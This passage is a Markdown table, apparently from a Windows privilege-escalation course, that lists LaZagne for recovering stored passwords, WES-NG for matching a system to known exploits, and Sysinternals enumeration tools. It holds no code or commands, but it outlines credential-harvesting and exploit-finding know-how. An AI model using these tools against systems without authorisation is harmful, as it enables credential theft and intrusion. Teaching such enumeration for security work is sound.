| [LaZagne](https://github.com/AlessandroZ/LaZagne)                                                        | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more                                                                             |
| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)                        | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported                 |
| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)         | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |